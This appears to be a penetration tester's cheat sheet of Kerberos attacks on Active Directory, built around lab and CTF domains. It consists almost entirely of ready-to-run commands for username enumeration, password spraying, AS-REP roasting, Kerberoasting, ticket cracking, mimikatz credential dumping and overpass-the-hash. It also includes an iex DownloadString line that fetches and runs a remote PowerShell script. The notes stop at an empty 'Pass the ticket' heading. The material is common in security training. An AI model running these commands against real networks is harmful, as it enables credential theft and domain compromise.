`! SYNC TIME WITH THE DC BEFORE TESTING!`

```
sudo ntpdate 192.168.188.165
```

1. Enumerate users <-- wordlist of possible domain usernames required

```
kerbrute userenum --dc DC01.heist.offsec -d heist.offsec users


kerbrute userenum -d scrm.local --dc scrm.local /usr/share/wordlists/kerberos_enum_userlists/A-ZSurnames.txt
```

2. Brute force + Password spraying

```
paste users passwords | sed 's/\t/:/g' >> user_password

kerbrute bruteforce --dc DC01.heist.offsec -d heist.offsec user_password 

kerbrute passwordspray --dc DC01.heist.offsec -d heist.offsec users "password"
```

VIM tip `:%s/.*/&:&` to create user:user list from users list

3. AS-REProast

```
#Try all the usernames in usernames.txt

python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format john -outputfile hashes.asreproast


#Use domain creds to extract targets and target them

GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/' -format john

while read p; do GetNPUsers.py egotistical-bank.local/"$p" -request -no-pass - dc-ip 10.10.10.175 >> hash.txt; done < unames.txt
```

use john to crack the ticket

```
john --format:krb5asrep /tmp/Kerberos --wordlist=/tmp/word
```

4. Kerberoasting

```
python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>

.\Rubeus.exe kerberoast /outfile:<output_TGSs_file>


iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>
```

for kerberos auth

```
impacket-getTGT scrm.local/ksimpson:ksimpson

export KRB5CCNAME=ksimpson.ccache
impacket-GetUserSPNs 'scrm.local/ksimpson:ksimpson' -request -k -dc-ip dc1.scrm.local
```

then try to crack the ticket

```
hashcat -m 13100 --force <TGSs_file> <passwords_file>

john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>
```

5. Overpass the Hash/Pass the Key (PTK) <-- use NTLM hash to request kerberos ticket

get the NTLM hash

```mimkatz
sekurlsa::logonpasswords


sekurlsa::pth /user:jeff_admin /domain:corp.com
/ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
```

```rubeus
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
```

```
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
```

6. Pass the ticket